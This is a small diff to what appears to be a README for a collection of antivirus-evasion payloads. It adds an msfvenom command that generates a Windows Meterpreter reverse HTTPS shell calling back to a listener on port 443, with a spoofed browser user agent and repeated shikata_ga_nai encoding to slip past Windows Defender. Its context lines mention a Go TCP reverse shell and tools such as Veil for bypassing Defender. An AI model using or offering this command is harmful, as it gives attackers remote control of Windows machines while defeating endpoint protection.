@@ -19,4 +19,7 @@
 12. `go_rtcp.exe` is a tcp reverse shell written in go. X
 
 
+Generating HTTPS reverse shell ```msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.10 LPORT=443 HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -e x86/shikata_ga_nai -i 8 -f c > shell.c
+```
+
 A number of tools and lanaguages was used to the process of trying to bypass windows defender, including: Veil, metasploit windows defender evasion, complining custom payloads, we tried payloads encoded using python, c, c++, c#, ruby, go, java.
